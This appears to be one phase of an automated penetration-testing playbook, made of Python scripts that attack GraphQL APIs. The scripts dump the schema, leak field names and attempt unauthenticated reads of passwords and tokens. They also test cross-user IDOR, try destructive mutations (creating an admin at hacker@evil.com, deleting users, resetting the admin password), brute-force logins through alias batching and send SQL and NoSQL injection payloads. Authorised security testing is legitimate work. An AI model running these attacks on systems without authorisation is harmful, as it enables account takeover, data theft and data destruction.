**Phase 15 — GraphQL Testing**

Run this phase ONLY if a GraphQL endpoint was found during recon (Phase 1 probed /graphql,
/api/graphql, /v1/graphql, /query, /gql). Check GRAPHQL_URL variable before running.

```python
import json

# ── Step 0: confirm endpoint and set URL ──────────────────────────────────────
GRAPHQL_ENDPOINTS = [
    BASE + '/graphql',
    BASE + '/api/graphql',
    BASE + '/v1/graphql',
    BASE + '/query',
    BASE + '/gql',
    BASE + '/graphiql',
]

GRAPHQL_URL = None
for ep in GRAPHQL_ENDPOINTS:
    try:
        r = session.post(ep, json={"query": "{__typename}"}, timeout=8)
        if r.status_code in (200, 400) and ('data' in r.text or 'errors' in r.text):
            GRAPHQL_URL = ep
            print(f"[INFO] GraphQL endpoint confirmed: {ep} (HTTP {r.status_code})")
            break
        r2 = session.get(ep, timeout=8)
        if 'graphql' in r2.text.lower() or 'graphiql' in r2.text.lower():
            GRAPHQL_URL = ep
            print(f"[INFO] GraphQL UI found: {ep}")
            break
    except Exception:
        pass

if not GRAPHQL_URL:
    print("[INFO] No GraphQL endpoint found — skipping Phase 15")
else:
    print(f"[+] GraphQL URL: {GRAPHQL_URL}")
```

```python
# ── Step 1: Introspection — dump the full schema ──────────────────────────────
# Introspection enabled = [HIGH] — exposes all types, queries, mutations, fields.
INTROSPECTION_QUERY = (
    "{ __schema {"
    " queryType { name }"
    " mutationType { name }"
    " subscriptionType { name }"
    " types { name kind fields {"
    "   name"
    "   type { name kind ofType { name kind } }"
    "   args { name type { name kind ofType { name kind } } }"
    " } } } }"
)

r = session.post(GRAPHQL_URL, json={"query": INTROSPECTION_QUERY}, timeout=20)
data = r.json() if r.status_code == 200 else {}

if 'data' in data and data['data'] and '__schema' in data['data']:
    schema = data['data']['__schema']
    print("[HIGH] GraphQL introspection is ENABLED — full schema exposed")

    # Extract all queries
    query_type = schema.get('queryType', {})
    print(f"  Query root type: {query_type.get('name')}")

    # Extract all mutations
    mut_type = schema.get('mutationType') or {}
    print(f"  Mutation root type: {mut_type.get('name')}")

    # List all non-builtin types and their fields
    custom_types = [t for t in schema.get('types', [])
                    if t['name'] and not t['name'].startswith('__')]
    print(f"  Types found: {len(custom_types)}")
    for t in custom_types:
        fields = t.get('fields') or []
        if fields:
            field_names = [f['name'] for f in fields]
            print(f"    {t['name']}: {', '.join(field_names)}")

    # Save full schema to file
    with open('graphql_schema.json', 'w') as f:
        json.dump(data, f, indent=2)
    print("  Full schema saved to graphql_schema.json")
elif 'errors' in data:
    err = str(data['errors']).lower()
    if 'introspection' in err or 'disabled' in err or 'not allowed' in err:
        print("[INFO] Introspection disabled — trying field suggestions next")
    else:
        print(f"[INFO] Introspection returned errors: {data['errors'][:2]}")
else:
    print(f"[INFO] Introspection not available (HTTP {r.status_code})")
```

```python
# ── Step 2: Field Suggestions — leaks fields even without introspection ────────
# Many servers disable introspection but still return "Did you mean X?" hints.
# This reveals real field names one letter at a time.
# Severity: [MEDIUM] — bypasses introspection controls.

probe_queries = [
    '{ user { emai } }',          # expects "Did you mean email?"
    '{ user { passwor } }',       # expects "Did you mean password?"
    '{ users { nam } }',          # expects "Did you mean name?"
    '{ me { rol } }',             # expects "Did you mean role?"
    '{ product { pric } }',       # expects "Did you mean price?"
    '{ order { tota } }',         # expects "Did you mean total?"
]

suggestions_found = []
for q in probe_queries:
    try:
        r = session.post(GRAPHQL_URL, json={"query": q}, timeout=8)
        text = r.text
        if 'did you mean' in text.lower() or 'suggestions' in text.lower():
            import re
            hints = re.findall(r'[Dd]id you mean ["\']?(\w+)["\']?', text)
            if hints:
                suggestions_found.extend(hints)
                print(f"[MEDIUM] Field suggestion leaked: {hints} (from query: {q.strip()})")
    except Exception:
        pass

if suggestions_found:
    print(f"[MEDIUM] GraphQL field suggestions enabled — {len(suggestions_found)} field names leaked: {suggestions_found}")
    print("  This bypasses introspection=disabled protection")
else:
    print("[INFO] No field suggestions returned — server may have suggestions disabled")
```

```python
# ── Step 3: Unauthenticated query access ──────────────────────────────────────
# Test sensitive queries WITHOUT authentication — auth bypass = [CRITICAL].
# Use the field names discovered in Steps 1-2.

unauth_session = requests.Session()
unauth_session.verify = False

sensitive_queries = [
    ('users list',    '{ users { id email role password } }'),
    ('me/profile',    '{ me { id email role token } }'),
    ('admin data',    '{ admin { users { id email } } }'),
    ('user by id',    '{ user(id: 1) { id email role password } }'),
    ('all orders',    '{ orders { id total user { email } } }'),
    ('all products',  '{ products { id name price cost } }'),
]

for label, query in sensitive_queries:
    try:
        r = unauth_session.post(GRAPHQL_URL, json={"query": query}, timeout=8)
        d = r.json() if r.status_code == 200 else {}
        if 'data' in d and d['data'] and any(v for v in d['data'].values() if v):
            print(f"[CRITICAL] Unauthenticated access to '{label}': {str(d['data'])[:200]}")
        elif 'errors' in d:
            errs = str(d['errors']).lower()
            if 'auth' in errs or 'login' in errs or 'permission' in errs or 'unauthorized' in errs:
                print(f"[INFO] '{label}' — auth required (expected)")
            else:
                print(f"[INFO] '{label}' — error: {d['errors'][0].get('message','')[:80]}")
    except Exception as e:
        print(f"[INFO] '{label}' — {e}")
```

```python
# ── Step 4: IDOR via GraphQL arguments ────────────────────────────────────────
# Query other users' objects by changing ID arguments.
# Requires two sessions — use session (user A) and session_b (user B) from Phase 3 crawl.
# Severity: [CRITICAL] if cross-user data is returned.

if 'session_b' in dir() or 'session_b' in _G:
    id_queries = [
        ('user profile',  '{ user(id: %d) { id email role phone } }'),
        ('order detail',  '{ order(id: %d) { id total status items { name } } }'),
        ('invoice',       '{ invoice(id: %d) { id amount dueDate user { email } } }'),
    ]

    for label, query_tpl in id_queries:
        # Get session A's object at ID 1
        r_a = session.post(GRAPHQL_URL, json={"query": query_tpl % 1}, timeout=8)
        d_a = r_a.json() if r_a.status_code == 200 else {}
        data_a = d_a.get('data') or {}
        if not any(v for v in data_a.values() if v):
            continue  # field doesn't exist

        # Access it with session B (different user)
        r_b = session_b.post(GRAPHQL_URL, json={"query": query_tpl % 1}, timeout=8)
        d_b = r_b.json() if r_b.status_code == 200 else {}
        data_b = d_b.get('data') or {}

        if any(v for v in data_b.values() if v):
            print(f"[CRITICAL] GraphQL IDOR on '{label}': Session B reads Session A's object")
            print(f"  Session A data: {str(data_a)[:150]}")
            print(f"  Session B data: {str(data_b)[:150]}")
        else:
            print(f"[INFO] '{label}' — access control enforced (IDOR not confirmed)")
else:
    print("[INFO] No second session available — skipping IDOR cross-user test")
    print("  Set credentials for Session B in Phase 3 to enable this test")
```

```python
# ── Step 5: Mutation testing — unauthenticated writes ─────────────────────────
# Mutations that succeed without auth = [CRITICAL].

mutations = [
    ('create user',    'mutation { createUser(email:"hacker@evil.com" password:"Test1234!" role:"admin") { id email role } }'),
    ('delete user',    'mutation { deleteUser(id: 1) { success } }'),
    ('update role',    'mutation { updateUser(id: 1 role:"admin") { id role } }'),
    ('reset password', 'mutation { resetPassword(email:"admin@target.com") { success token } }'),
    ('register',       'mutation { register(email:"test@evil.com" password:"Test1234!") { token user { id role } } }'),
]

for label, mutation in mutations:
    try:
        r = unauth_session.post(GRAPHQL_URL, json={"query": mutation}, timeout=8)
        d = r.json() if r.status_code == 200 else {}
        if 'data' in d and d['data'] and any(v for v in d['data'].values() if v):
            print(f"[CRITICAL] Unauthenticated mutation '{label}' succeeded!")
            print(f"  Response: {str(d['data'])[:200]}")
        elif 'errors' in d:
            msg = d['errors'][0].get('message', '') if d['errors'] else ''
            if any(k in msg.lower() for k in ('auth', 'login', 'permission', 'unauthorized', 'forbidden')):
                print(f"[INFO] '{label}' — blocked (auth required)")
            else:
                print(f"[INFO] '{label}' — error: {msg[:80]}")
    except Exception as e:
        print(f"[INFO] '{label}' — {e}")
```

```python
# ── Step 6: Alias batching — rate limit bypass ────────────────────────────────
# Send 10 login attempts in a single HTTP request using GraphQL aliases.
# If all 10 succeed without 429 = [HIGH] rate limit bypass.

batch_query = "mutation { " + " ".join([
    f'a{i}: login(email:"admin@target.com" password:"guess{i}") {{ token }}'
    for i in range(10)
]) + " }"

r = session.post(GRAPHQL_URL, json={"query": batch_query}, timeout=15)
if r.status_code == 200:
    d = r.json()
    if 'data' in d:
        successful = [k for k, v in (d['data'] or {}).items() if v and v.get('token')]
        if successful:
            print(f"[CRITICAL] Alias batching: {len(successful)}/10 login attempts returned tokens!")
        else:
            print(f"[HIGH] Alias batching allowed: 10 logins sent in 1 request (no rate limit detected)")
            print("  Server accepted batch — brute-force rate limit can be bypassed via GraphQL aliases")
    if 'errors' in d and any('batch' in str(e).lower() or 'alias' in str(e).lower() for e in d.get('errors',[])):
        print("[INFO] Alias batching blocked by server")
elif r.status_code == 429:
    print("[INFO] Rate limiting works against batching (HTTP 429)")
else:
    print(f"[INFO] Batch query returned HTTP {r.status_code}")
```

```python
# ── Step 7: SQL/NoSQL injection in GraphQL arguments ─────────────────────────
# GraphQL arguments pass through to DB resolvers — same injection risks as REST.

injection_payloads = [
    ("SQLi OR",        "' OR '1'='1"),
    ("SQLi comment",   "1; --"),
    ("SQLi UNION",     "1 UNION SELECT 1,2,3--"),
    ("NoSQL $ne",      '{"$ne": null}'),
    ("NoSQL $gt",      '{"$gt": ""}'),
]

injection_queries = [
    '{ user(id: "%s") { id email role } }',
    '{ user(email: "%s") { id email role } }',
    '{ search(query: "%s") { results { id name } } }',
]

for query_tpl in injection_queries:
    for label, payload in injection_payloads:
        try:
            q = query_tpl % payload
            r = session.post(GRAPHQL_URL, json={"query": q}, timeout=8)
            d = r.json() if r.status_code == 200 else {}
            response_text = str(d)

            # SQL error in response = confirmed injection point
            sql_errors = ['syntax error', 'sql', 'mysql', 'postgres', 'sqlite',
                          'ora-', 'odbc', 'jdbc', 'unterminated', 'unexpected token']
            if any(e in response_text.lower() for e in sql_errors):
                print(f"[HIGH] GraphQL injection — SQL error in response!")
                print(f"  Query: {q[:100]}")
                print(f"  Error: {response_text[:200]}")

            # Data returned with injection = critical
            elif 'data' in d and d['data'] and any(v for v in d['data'].values() if v):
                if payload in ("' OR '1'='1", '{"$ne": null}', '{"$gt": ""}'):
                    print(f"[HIGH] Possible {label} injection — data returned for injected payload")
                    print(f"  Query: {q[:100]}")
                    print(f"  Data:  {str(d['data'])[:150]}")
        except Exception:
            pass
```

```python
# ── Phase 15 Summary ──────────────────────────────────────────────────────────
print("=" * 60)
print("PHASE 10 COMPLETE — GraphQL Testing")
print("Tested: introspection, field suggestions, unauth access,")
print("        IDOR, mutations, alias batching, injection")
print("=" * 60)
```
